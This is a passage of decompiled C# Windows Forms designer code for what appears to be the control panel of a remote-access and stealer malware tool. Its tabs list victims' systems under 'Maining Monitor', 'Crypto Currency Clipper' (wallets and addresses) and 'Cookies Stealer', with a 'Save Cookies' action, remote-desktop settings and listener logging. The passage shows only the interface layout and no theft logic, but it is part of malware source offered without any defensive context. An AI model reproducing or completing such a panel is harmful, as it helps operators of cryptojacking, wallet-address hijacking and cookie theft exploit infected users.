		Panel44.Size = new Size(251, 34);
		Panel44.TabIndex = 68;
		Mining_Scan.Animated = true;
		Mining_Scan.AutoRoundedCorners = true;
		Mining_Scan.BorderRadius = 12;
		Mining_Scan.CheckedState.Parent = Mining_Scan;
		Mining_Scan.CustomImages.Parent = Mining_Scan;
		Mining_Scan.FillColor = Color.FromArgb(46, 51, 73);
		Mining_Scan.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Mining_Scan.ForeColor = Color.LimeGreen;
		Mining_Scan.HoverState.Parent = Mining_Scan;
		Mining_Scan.IndicateFocus = true;
		Mining_Scan.Location = new Point(187, 3);
		Mining_Scan.Name = "Mining_Scan";
		Mining_Scan.ShadowDecoration.Parent = Mining_Scan;
		Mining_Scan.Size = new Size(61, 27);
		Mining_Scan.TabIndex = 72;
		Mining_Scan.Text = "0 PC+";
		Label95.AutoSize = true;
		Label95.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label95.ForeColor = Color.FromArgb(158, 161, 176);
		Label95.Location = new Point(13, 7);
		Label95.Name = "Label95";
		Label95.Size = new Size(76, 16);
		Label95.TabIndex = 0;
		Label95.Text = "Scan found";
		PictureBox89.Image = (Image)componentResourceManager.GetObject("PictureBox89.Image");
		PictureBox89.Location = new Point(269, 92);
		PictureBox89.Name = "PictureBox89";
		PictureBox89.Size = new Size(49, 34);
		PictureBox89.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox89.TabIndex = 67;
		PictureBox89.TabStop = false;
		Panel45.BackColor = Color.FromArgb(24, 30, 54);
		Panel45.Controls.Add(Mining_len);
		Panel45.Controls.Add(Label96);
		Panel45.Location = new Point(10, 43);
		Panel45.Name = "Panel45";
		Panel45.Size = new Size(251, 34);
		Panel45.TabIndex = 64;
		Mining_len.Animated = true;
		Mining_len.AutoRoundedCorners = true;
		Mining_len.BorderRadius = 12;
		Mining_len.CheckedState.Parent = Mining_len;
		Mining_len.CustomImages.Parent = Mining_len;
		Mining_len.FillColor = Color.FromArgb(46, 51, 73);
		Mining_len.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Mining_len.ForeColor = Color.MediumPurple;
		Mining_len.HoverState.Parent = Mining_len;
		Mining_len.IndicateFocus = true;
		Mining_len.Location = new Point(187, 3);
		Mining_len.Name = "Mining_len";
		Mining_len.ShadowDecoration.Parent = Mining_len;
		Mining_len.Size = new Size(61, 27);
		Mining_len.TabIndex = 72;
		Mining_len.Text = "0 PC+";
		Label96.AutoSize = true;
		Label96.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label96.ForeColor = Color.FromArgb(158, 161, 176);
		Label96.Location = new Point(13, 7);
		Label96.Name = "Label96";
		Label96.Size = new Size(117, 16);
		Label96.TabIndex = 0;
		Label96.Text = "Number of callers";
		PictureBox90.Image = (Image)componentResourceManager.GetObject("PictureBox90.Image");
		PictureBox90.Location = new Point(269, 43);
		PictureBox90.Name = "PictureBox90";
		PictureBox90.Size = new Size(49, 34);
		PictureBox90.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox90.TabIndex = 2;
		PictureBox90.TabStop = false;
		Label97.AutoSize = true;
		Label97.Font = new Font("Nirmala UI", 14.25f, FontStyle.Bold);
		Label97.ForeColor = Color.FromArgb(224, 224, 224);
		Label97.Location = new Point(5, 7);
		Label97.Name = "Label97";
		Label97.Size = new Size(165, 25);
		Label97.TabIndex = 0;
		Label97.Text = "Maining Monitor";
		Guna2CircleProgressBar3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2CircleProgressBar3.Animated = true;
		Guna2CircleProgressBar3.Controls.Add(PictureBox91);
		Guna2CircleProgressBar3.Location = new Point(764, 7);
		Guna2CircleProgressBar3.Name = "Guna2CircleProgressBar3";
		Guna2CircleProgressBar3.ProgressColor = Color.Yellow;
		Guna2CircleProgressBar3.ProgressColor2 = Color.Red;
		Guna2CircleProgressBar3.ShadowDecoration.Mode = ShadowMode.Circle;
		Guna2CircleProgressBar3.ShadowDecoration.Parent = Guna2CircleProgressBar3;
		Guna2CircleProgressBar3.Size = new Size(130, 130);
		Guna2CircleProgressBar3.TabIndex = 4;
		Guna2CircleProgressBar3.Value = 45;
		PictureBox91.Image = (Image)componentResourceManager.GetObject("PictureBox91.Image");
		PictureBox91.Location = new Point(39, 43);
		PictureBox91.Name = "PictureBox91";
		PictureBox91.Size = new Size(48, 46);
		PictureBox91.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox91.TabIndex = 5;
		PictureBox91.TabStop = false;
		L1_Miner.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		L1_Miner.BackColor = Color.FromArgb(24, 30, 54);
		L1_Miner.BorderStyle = BorderStyle.None;
		L1_Miner.Columns.AddRange(new ColumnHeader[6]
		{
			vmethod_101(),
			vmethod_103(),
			vmethod_105(),
			vmethod_107(),
			vmethod_109(),
			vmethod_111()
		});
		L1_Miner.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		L1_Miner.ForeColor = Color.White;
		L1_Miner.FullRowSelect = true;
		L1_Miner.HideSelection = false;
		L1_Miner.LargeImageList = vmethod_16();
		L1_Miner.Location = new Point(8, 160);
		L1_Miner.Name = "L1_Miner";
		L1_Miner.Size = new Size(904, 276);
		L1_Miner.SmallImageList = vmethod_16();
		L1_Miner.StateImageList = vmethod_16();
		L1_Miner.TabIndex = 116;
		L1_Miner.UseCompatibleStateImageBehavior = false;
		L1_Miner.View = View.Details;
		vmethod_101().Text = "User name";
		vmethod_101().Width = 160;
		vmethod_103().Text = "System OS";
		vmethod_103().Width = 222;
		vmethod_105().Text = "CPU";
		vmethod_105().Width = 108;
		vmethod_107().Text = "AMD GUPs";
		vmethod_107().Width = 119;
		vmethod_109().Text = "NVIDIA GUPs";
		vmethod_109().Width = 169;
		vmethod_111().Text = "Process";
		vmethod_111().Width = 115;
		Grabberff.BackColor = Color.FromArgb(46, 51, 73);
		Grabberff.Controls.Add(Guna2GradientPanel16);
		Grabberff.Location = new Point(4, 22);
		Grabberff.Name = "Grabberff";
		Grabberff.Padding = new Padding(3);
		Grabberff.Size = new Size(925, 457);
		Grabberff.TabIndex = 6;
		Grabberff.Text = "Grbberss";
		Guna2GradientPanel16.BackColor = Color.FromArgb(46, 51, 73);
		Guna2GradientPanel16.Controls.Add(Panel46);
		Guna2GradientPanel16.Controls.Add(L1_Grabber);
		Guna2GradientPanel16.Dock = DockStyle.Fill;
		Guna2GradientPanel16.Location = new Point(3, 3);
		Guna2GradientPanel16.Name = "Guna2GradientPanel16";
		Guna2GradientPanel16.ShadowDecoration.Parent = Guna2GradientPanel16;
		Guna2GradientPanel16.Size = new Size(919, 451);
		Guna2GradientPanel16.TabIndex = 119;
		Panel46.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		Panel46.BackColor = Color.FromArgb(24, 30, 54);
		Panel46.Controls.Add(Panel47);
		Panel46.Controls.Add(PictureBox92);
		Panel46.Controls.Add(Panel48);
		Panel46.Controls.Add(PictureBox93);
		Panel46.Controls.Add(Label100);
		Panel46.Controls.Add(Guna2CircleProgressBar4);
		Panel46.Location = new Point(6, 6);
		Panel46.Name = "Panel46";
		Panel46.Size = new Size(904, 146);
		Panel46.TabIndex = 119;
		Panel47.BackColor = Color.FromArgb(24, 30, 54);
		Panel47.Controls.Add(Grabber_Scan);
		Panel47.Controls.Add(Label98);
		Panel47.Location = new Point(10, 92);
		Panel47.Name = "Panel47";
		Panel47.Size = new Size(251, 34);
		Panel47.TabIndex = 68;
		Grabber_Scan.Animated = true;
		Grabber_Scan.AutoRoundedCorners = true;
		Grabber_Scan.BorderRadius = 12;
		Grabber_Scan.CheckedState.Parent = Grabber_Scan;
		Grabber_Scan.CustomImages.Parent = Grabber_Scan;
		Grabber_Scan.FillColor = Color.FromArgb(46, 51, 73);
		Grabber_Scan.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Grabber_Scan.ForeColor = Color.LimeGreen;
		Grabber_Scan.HoverState.Parent = Grabber_Scan;
		Grabber_Scan.IndicateFocus = true;
		Grabber_Scan.Location = new Point(187, 3);
		Grabber_Scan.Name = "Grabber_Scan";
		Grabber_Scan.ShadowDecoration.Parent = Grabber_Scan;
		Grabber_Scan.Size = new Size(61, 27);
		Grabber_Scan.TabIndex = 72;
		Grabber_Scan.Text = "0 PC+";
		Label98.AutoSize = true;
		Label98.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label98.ForeColor = Color.FromArgb(158, 161, 176);
		Label98.Location = new Point(13, 7);
		Label98.Name = "Label98";
		Label98.Size = new Size(76, 16);
		Label98.TabIndex = 0;
		Label98.Text = "Scan found";
		PictureBox92.Image = (Image)componentResourceManager.GetObject("PictureBox92.Image");
		PictureBox92.Location = new Point(269, 92);
		PictureBox92.Name = "PictureBox92";
		PictureBox92.Size = new Size(49, 34);
		PictureBox92.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox92.TabIndex = 67;
		PictureBox92.TabStop = false;
		Panel48.BackColor = Color.FromArgb(24, 30, 54);
		Panel48.Controls.Add(Grabber_len);
		Panel48.Controls.Add(Label99);
		Panel48.Location = new Point(10, 43);
		Panel48.Name = "Panel48";
		Panel48.Size = new Size(251, 34);
		Panel48.TabIndex = 64;
		Grabber_len.Animated = true;
		Grabber_len.AutoRoundedCorners = true;
		Grabber_len.BorderRadius = 12;
		Grabber_len.CheckedState.Parent = Grabber_len;
		Grabber_len.CustomImages.Parent = Grabber_len;
		Grabber_len.FillColor = Color.FromArgb(46, 51, 73);
		Grabber_len.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Grabber_len.ForeColor = Color.MediumPurple;
		Grabber_len.HoverState.Parent = Grabber_len;
		Grabber_len.IndicateFocus = true;
		Grabber_len.Location = new Point(187, 3);
		Grabber_len.Name = "Grabber_len";
		Grabber_len.ShadowDecoration.Parent = Grabber_len;
		Grabber_len.Size = new Size(61, 27);
		Grabber_len.TabIndex = 72;
		Grabber_len.Text = "0 PC+";
		Label99.AutoSize = true;
		Label99.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label99.ForeColor = Color.FromArgb(158, 161, 176);
		Label99.Location = new Point(13, 7);
		Label99.Name = "Label99";
		Label99.Size = new Size(117, 16);
		Label99.TabIndex = 0;
		Label99.Text = "Number of callers";
		PictureBox93.Image = (Image)componentResourceManager.GetObject("PictureBox93.Image");
		PictureBox93.Location = new Point(269, 43);
		PictureBox93.Name = "PictureBox93";
		PictureBox93.Size = new Size(49, 34);
		PictureBox93.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox93.TabIndex = 2;
		PictureBox93.TabStop = false;
		Label100.AutoSize = true;
		Label100.Font = new Font("Nirmala UI", 14.25f, FontStyle.Bold);
		Label100.ForeColor = Color.FromArgb(224, 224, 224);
		Label100.Location = new Point(5, 7);
		Label100.Name = "Label100";
		Label100.Size = new Size(229, 25);
		Label100.TabIndex = 0;
		Label100.Text = "Crypto Currency Clipper";
		Guna2CircleProgressBar4.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2CircleProgressBar4.Animated = true;
		Guna2CircleProgressBar4.Controls.Add(PictureBox94);
		Guna2CircleProgressBar4.Location = new Point(764, 7);
		Guna2CircleProgressBar4.Name = "Guna2CircleProgressBar4";
		Guna2CircleProgressBar4.ProgressColor = Color.Yellow;
		Guna2CircleProgressBar4.ProgressColor2 = Color.Red;
		Guna2CircleProgressBar4.ShadowDecoration.Mode = ShadowMode.Circle;
		Guna2CircleProgressBar4.ShadowDecoration.Parent = Guna2CircleProgressBar4;
		Guna2CircleProgressBar4.Size = new Size(130, 130);
		Guna2CircleProgressBar4.TabIndex = 4;
		Guna2CircleProgressBar4.Value = 45;
		PictureBox94.Image = (Image)componentResourceManager.GetObject("PictureBox94.Image");
		PictureBox94.Location = new Point(39, 43);
		PictureBox94.Name = "PictureBox94";
		PictureBox94.Size = new Size(48, 46);
		PictureBox94.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox94.TabIndex = 5;
		PictureBox94.TabStop = false;
		L1_Grabber.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		L1_Grabber.BackColor = Color.FromArgb(24, 30, 54);
		L1_Grabber.BorderStyle = BorderStyle.None;
		L1_Grabber.Columns.AddRange(new ColumnHeader[4]
		{
			vmethod_113(),
			vmethod_115(),
			vmethod_117(),
			vmethod_119()
		});
		L1_Grabber.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		L1_Grabber.ForeColor = Color.White;
		L1_Grabber.FullRowSelect = true;
		L1_Grabber.HideSelection = false;
		L1_Grabber.LargeImageList = vmethod_16();
		L1_Grabber.Location = new Point(6, 159);
		L1_Grabber.Name = "L1_Grabber";
		L1_Grabber.Size = new Size(906, 276);
		L1_Grabber.SmallImageList = vmethod_16();
		L1_Grabber.StateImageList = vmethod_16();
		L1_Grabber.TabIndex = 116;
		L1_Grabber.UseCompatibleStateImageBehavior = false;
		L1_Grabber.View = View.Details;
		vmethod_113().Text = "User name";
		vmethod_113().Width = 160;
		vmethod_115().Text = "System OS";
		vmethod_115().Width = 222;
		vmethod_117().Text = "Wallet";
		vmethod_117().Width = 75;
		vmethod_119().Text = "Address";
		vmethod_119().Width = 425;
		Logs.BackColor = Color.FromArgb(46, 51, 73);
		Logs.Controls.Add(Guna2GradientPanel17);
		Logs.Location = new Point(4, 22);
		Logs.Name = "Logs";
		Logs.Padding = new Padding(3);
		Logs.Size = new Size(925, 457);
		Logs.TabIndex = 7;
		Logs.Text = "logsss";
		Guna2GradientPanel17.BackColor = Color.FromArgb(46, 51, 73);
		Guna2GradientPanel17.Controls.Add(Panel49);
		Guna2GradientPanel17.Controls.Add(Logisx);
		Guna2GradientPanel17.Dock = DockStyle.Fill;
		Guna2GradientPanel17.Location = new Point(3, 3);
		Guna2GradientPanel17.Name = "Guna2GradientPanel17";
		Guna2GradientPanel17.ShadowDecoration.Parent = Guna2GradientPanel17;
		Guna2GradientPanel17.Size = new Size(919, 451);
		Guna2GradientPanel17.TabIndex = 120;
		Panel49.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		Panel49.BackColor = Color.FromArgb(24, 30, 54);
		Panel49.Controls.Add(Panel50);
		Panel49.Controls.Add(PictureBox95);
		Panel49.Controls.Add(Panel51);
		Panel49.Controls.Add(PictureBox96);
		Panel49.Controls.Add(Label103);
		Panel49.Controls.Add(Guna2CircleProgressBar5);
		Panel49.Location = new Point(6, 6);
		Panel49.Name = "Panel49";
		Panel49.Size = new Size(904, 146);
		Panel49.TabIndex = 120;
		Panel50.BackColor = Color.FromArgb(24, 30, 54);
		Panel50.Controls.Add(Cookies_scan);
		Panel50.Controls.Add(Label101);
		Panel50.Location = new Point(10, 92);
		Panel50.Name = "Panel50";
		Panel50.Size = new Size(251, 34);
		Panel50.TabIndex = 68;
		Cookies_scan.Animated = true;
		Cookies_scan.AutoRoundedCorners = true;
		Cookies_scan.BorderRadius = 12;
		Cookies_scan.CheckedState.Parent = Cookies_scan;
		Cookies_scan.CustomImages.Parent = Cookies_scan;
		Cookies_scan.FillColor = Color.FromArgb(46, 51, 73);
		Cookies_scan.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Cookies_scan.ForeColor = Color.LimeGreen;
		Cookies_scan.HoverState.Parent = Cookies_scan;
		Cookies_scan.IndicateFocus = true;
		Cookies_scan.Location = new Point(187, 3);
		Cookies_scan.Name = "Cookies_scan";
		Cookies_scan.ShadowDecoration.Parent = Cookies_scan;
		Cookies_scan.Size = new Size(61, 27);
		Cookies_scan.TabIndex = 72;
		Cookies_scan.Text = "0 PC+";
		Label101.AutoSize = true;
		Label101.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label101.ForeColor = Color.FromArgb(158, 161, 176);
		Label101.Location = new Point(13, 7);
		Label101.Name = "Label101";
		Label101.Size = new Size(76, 16);
		Label101.TabIndex = 0;
		Label101.Text = "Scan found";
		PictureBox95.Image = (Image)componentResourceManager.GetObject("PictureBox95.Image");
		PictureBox95.Location = new Point(269, 92);
		PictureBox95.Name = "PictureBox95";
		PictureBox95.Size = new Size(49, 34);
		PictureBox95.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox95.TabIndex = 67;
		PictureBox95.TabStop = false;
		Panel51.BackColor = Color.FromArgb(24, 30, 54);
		Panel51.Controls.Add(Cookies_len);
		Panel51.Controls.Add(Label102);
		Panel51.Location = new Point(10, 43);
		Panel51.Name = "Panel51";
		Panel51.Size = new Size(251, 34);
		Panel51.TabIndex = 64;
		Cookies_len.Animated = true;
		Cookies_len.AutoRoundedCorners = true;
		Cookies_len.BorderRadius = 12;
		Cookies_len.CheckedState.Parent = Cookies_len;
		Cookies_len.CustomImages.Parent = Cookies_len;
		Cookies_len.FillColor = Color.FromArgb(46, 51, 73);
		Cookies_len.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Cookies_len.ForeColor = Color.MediumPurple;
		Cookies_len.HoverState.Parent = Cookies_len;
		Cookies_len.IndicateFocus = true;
		Cookies_len.Location = new Point(187, 3);
		Cookies_len.Name = "Cookies_len";
		Cookies_len.ShadowDecoration.Parent = Cookies_len;
		Cookies_len.Size = new Size(61, 27);
		Cookies_len.TabIndex = 72;
		Cookies_len.Text = "0 PC+";
		Label102.AutoSize = true;
		Label102.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label102.ForeColor = Color.FromArgb(158, 161, 176);
		Label102.Location = new Point(13, 7);
		Label102.Name = "Label102";
		Label102.Size = new Size(117, 16);
		Label102.TabIndex = 0;
		Label102.Text = "Number of callers";
		PictureBox96.Image = (Image)componentResourceManager.GetObject("PictureBox96.Image");
		PictureBox96.Location = new Point(269, 43);
		PictureBox96.Name = "PictureBox96";
		PictureBox96.Size = new Size(49, 34);
		PictureBox96.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox96.TabIndex = 2;
		PictureBox96.TabStop = false;
		Label103.AutoSize = true;
		Label103.Font = new Font("Nirmala UI", 14.25f, FontStyle.Bold);
		Label103.ForeColor = Color.FromArgb(224, 224, 224);
		Label103.Location = new Point(5, 7);
		Label103.Name = "Label103";
		Label103.Size = new Size(147, 25);
		Label103.TabIndex = 0;
		Label103.Text = "Cookies Stealer";
		Guna2CircleProgressBar5.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2CircleProgressBar5.Animated = true;
		Guna2CircleProgressBar5.Controls.Add(PictureBox97);
		Guna2CircleProgressBar5.Location = new Point(764, 7);
		Guna2CircleProgressBar5.Name = "Guna2CircleProgressBar5";
		Guna2CircleProgressBar5.ProgressColor = Color.Yellow;
		Guna2CircleProgressBar5.ProgressColor2 = Color.Red;
		Guna2CircleProgressBar5.ShadowDecoration.Mode = ShadowMode.Circle;
		Guna2CircleProgressBar5.ShadowDecoration.Parent = Guna2CircleProgressBar5;
		Guna2CircleProgressBar5.Size = new Size(130, 130);
		Guna2CircleProgressBar5.TabIndex = 4;
		Guna2CircleProgressBar5.Value = 45;
		PictureBox97.Image = (Image)componentResourceManager.GetObject("PictureBox97.Image");
		PictureBox97.Location = new Point(39, 43);
		PictureBox97.Name = "PictureBox97";
		PictureBox97.Size = new Size(48, 46);
		PictureBox97.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox97.TabIndex = 5;
		PictureBox97.TabStop = false;
		Logisx.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		Logisx.BackColor = Color.FromArgb(24, 30, 54);
		Logisx.BorderStyle = BorderStyle.None;
		Logisx.Columns.AddRange(new ColumnHeader[4]
		{
			vmethod_121(),
			vmethod_123(),
			vmethod_125(),
			vmethod_131()
		});
		Logisx.ContextMenuStrip = vmethod_127();
		Logisx.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Logisx.ForeColor = Color.White;
		Logisx.FullRowSelect = true;
		Logisx.HideSelection = false;
		Logisx.LargeImageList = vmethod_16();
		Logisx.Location = new Point(6, 158);
		Logisx.Name = "Logisx";
		Logisx.Size = new Size(904, 279);
		Logisx.SmallImageList = vmethod_16();
		Logisx.StateImageList = vmethod_16();
		Logisx.TabIndex = 116;
		Logisx.UseCompatibleStateImageBehavior = false;
		Logisx.View = View.Details;
		vmethod_121().Text = "User name";
		vmethod_121().Width = 160;
		vmethod_123().Text = "System OS";
		vmethod_123().Width = 222;
		vmethod_125().Text = "Cookies";
		vmethod_125().Width = 147;
		vmethod_131().Text = "Status";
		vmethod_131().Width = 368;
		vmethod_127().BackColor = Color.FromArgb(24, 30, 54);
		vmethod_127().Font = new Font("Segoe UI", 14.25f, FontStyle.Bold);
		vmethod_127().ImageScalingSize = new Size(32, 32);
		vmethod_127().Items.AddRange(new ToolStripItem[1] { ToolStripMenuItem30 });
		vmethod_127().Name = "ContextMenuStrip2";
		vmethod_127().RenderMode = ToolStripRenderMode.System;
		vmethod_127().Size = new Size(171, 42);
		ToolStripMenuItem30.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem30.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem30.ForeColor = Color.White;
		ToolStripMenuItem30.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem30.Image");
		ToolStripMenuItem30.Name = "ToolStripMenuItem30";
		ToolStripMenuItem30.Size = new Size(170, 38);
		ToolStripMenuItem30.Text = "Save Cookies";
		Settings.BackColor = Color.FromArgb(24, 30, 54);
		Settings.Controls.Add(Guna2GradientButton2);
		Settings.Controls.Add(Panel27);
		Settings.Controls.Add(Panel26);
		Settings.Controls.Add(Panel25);
		Settings.Controls.Add(Panel5);
		Settings.Controls.Add(Panel3);
		Settings.Location = new Point(4, 22);
		Settings.Name = "Settings";
		Settings.Padding = new Padding(3);
		Settings.Size = new Size(925, 457);
		Settings.TabIndex = 8;
		Settings.Text = "Settings";
		Guna2GradientButton2.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Guna2GradientButton2.Animated = true;
		Guna2GradientButton2.BackColor = Color.Transparent;
		Guna2GradientButton2.CheckedState.Parent = Guna2GradientButton2;
		Guna2GradientButton2.CustomImages.Parent = Guna2GradientButton2;
		Guna2GradientButton2.FillColor = Color.FromArgb(37, 42, 64);
		Guna2GradientButton2.FillColor2 = Color.FromArgb(37, 42, 64);
		Guna2GradientButton2.Font = new Font("Segoe UI", 9f);
		Guna2GradientButton2.ForeColor = Color.White;
		Guna2GradientButton2.HoverState.Parent = Guna2GradientButton2;
		Guna2GradientButton2.IndicateFocus = true;
		Guna2GradientButton2.Location = new Point(158, 391);
		Guna2GradientButton2.Name = "Guna2GradientButton2";
		Guna2GradientButton2.ShadowDecoration.Parent = Guna2GradientButton2;
		Guna2GradientButton2.Size = new Size(581, 45);
		Guna2GradientButton2.TabIndex = 112;
		Guna2GradientButton2.Text = "Save";
		Guna2GradientButton2.UseTransparentBackground = true;
		Panel27.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Panel27.BackColor = Color.FromArgb(37, 42, 64);
		Panel27.Controls.Add(PictureBox25);
		Panel27.Controls.Add(scrI);
		Panel27.Controls.Add(Label39);
		Panel27.ForeColor = Color.FromArgb(37, 42, 64);
		Panel27.Location = new Point(450, 268);
		Panel27.Name = "Panel27";
		Panel27.Size = new Size(289, 117);
		Panel27.TabIndex = 117;
		PictureBox25.Image = (Image)componentResourceManager.GetObject("PictureBox25.Image");
		PictureBox25.Location = new Point(238, 6);
		PictureBox25.Name = "PictureBox25";
		PictureBox25.Size = new Size(48, 27);
		PictureBox25.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox25.TabIndex = 76;
		PictureBox25.TabStop = false;
		scrI.Animated = true;
		scrI.AutoRoundedCorners = true;
		scrI.BackColor = Color.FromArgb(37, 42, 64);
		scrI.BorderColor = Color.FromArgb(0, 126, 249);
		scrI.BorderRadius = 17;
		scrI.DrawMode = DrawMode.OwnerDrawFixed;
		scrI.DropDownStyle = ComboBoxStyle.DropDownList;
		scrI.FillColor = Color.FromArgb(37, 42, 64);
		scrI.FocusedColor = Color.FromArgb(94, 148, 255);
		scrI.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		scrI.FocusedState.Parent = scrI;
		scrI.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		scrI.ForeColor = Color.FromArgb(0, 192, 192);
		scrI.HoverState.Parent = scrI;
		scrI.ItemHeight = 30;
		scrI.Items.AddRange(new object[5] { "Ultra", "Fast", "Good", "Slow", "Slower" });
		scrI.ItemsAppearance.Parent = scrI;
		scrI.Location = new Point(18, 72);
		scrI.Name = "scrI";
		scrI.ShadowDecoration.Parent = scrI;
		scrI.Size = new Size(243, 36);
		scrI.Style = TextBoxStyle.Material;
		scrI.TabIndex = 105;
		Label39.AutoSize = true;
		Label39.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label39.ForeColor = Color.White;
		Label39.Location = new Point(3, 6);
		Label39.Name = "Label39";
		Label39.Size = new Size(105, 17);
		Label39.TabIndex = 1;
		Label39.Text = "Remote Desktop";
		Panel26.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Panel26.BackColor = Color.FromArgb(37, 42, 64);
		Panel26.Controls.Add(ShowAlert);
		Panel26.Controls.Add(LOGLERR);
		Panel26.Controls.Add(LOGMSGS);
		Panel26.Controls.Add(LOGRERR);
		Panel26.Controls.Add(LOGCONNECTIONS);
		Panel26.Controls.Add(LOGLOGIN);
		Panel26.Controls.Add(PictureBox18);
		Panel26.Controls.Add(Label38);
		Panel26.ForeColor = Color.FromArgb(37, 42, 64);
		Panel26.Location = new Point(450, 24);
		Panel26.Name = "Panel26";
		Panel26.Size = new Size(289, 238);
		Panel26.TabIndex = 116;
		ShowAlert.AutoSize = true;
		ShowAlert.BackColor = Color.FromArgb(37, 42, 64);
		ShowAlert.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		ShowAlert.CheckedState.BorderRadius = 20;
		ShowAlert.CheckedState.BorderThickness = 2;
		ShowAlert.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		ShowAlert.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		ShowAlert.ForeColor = Color.White;
		ShowAlert.Location = new Point(18, 177);
		ShowAlert.Name = "ShowAlert";
		ShowAlert.Size = new Size(84, 19);
		ShowAlert.TabIndex = 109;
		ShowAlert.Text = "Show Alert";
		ShowAlert.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		ShowAlert.UncheckedState.BorderRadius = 0;
		ShowAlert.UncheckedState.BorderThickness = 0;
		ShowAlert.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		ShowAlert.UseVisualStyleBackColor = false;
		LOGLERR.AutoSize = true;
		LOGLERR.BackColor = Color.FromArgb(37, 42, 64);
		LOGLERR.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		LOGLERR.CheckedState.BorderRadius = 20;
		LOGLERR.CheckedState.BorderThickness = 2;
		LOGLERR.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		LOGLERR.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		LOGLERR.ForeColor = Color.White;
		LOGLERR.Location = new Point(18, 93);
		LOGLERR.Name = "LOGLERR";
		LOGLERR.Size = new Size(94, 19);
		LOGLERR.TabIndex = 108;
		LOGLERR.Text = "Listner Errors";
		LOGLERR.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		LOGLERR.UncheckedState.BorderRadius = 0;
		LOGLERR.UncheckedState.BorderThickness = 0;
		LOGLERR.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		LOGLERR.UseVisualStyleBackColor = false;
		LOGMSGS.AutoSize = true;
		LOGMSGS.BackColor = Color.FromArgb(37, 42, 64);
		LOGMSGS.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		LOGMSGS.CheckedState.BorderRadius = 20;
		LOGMSGS.CheckedState.BorderThickness = 2;
		LOGMSGS.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		LOGMSGS.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		LOGMSGS.ForeColor = Color.White;
		LOGMSGS.Location = new Point(18, 149);
		LOGMSGS.Name = "LOGMSGS";
		LOGMSGS.Size = new Size(77, 19);
		LOGMSGS.TabIndex = 107;
		LOGMSGS.Text = "Messages";
		LOGMSGS.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		LOGMSGS.UncheckedState.BorderRadius = 0;
		LOGMSGS.UncheckedState.BorderThickness = 0;
		LOGMSGS.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		LOGMSGS.UseVisualStyleBackColor = false;
		LOGRERR.AutoSize = true;
		LOGRERR.BackColor = Color.FromArgb(37, 42, 64);
		LOGRERR.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		LOGRERR.CheckedState.BorderRadius = 20;
		LOGRERR.CheckedState.BorderThickness = 2;
		LOGRERR.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		LOGRERR.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		LOGRERR.ForeColor = Color.White;
		LOGRERR.Location = new Point(18, 121);
		LOGRERR.Name = "LOGRERR";
		LOGRERR.Size = new Size(100, 19);
		LOGRERR.TabIndex = 106;
		LOGRERR.Text = "Remote Errors";
		LOGRERR.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		LOGRERR.UncheckedState.BorderRadius = 0;
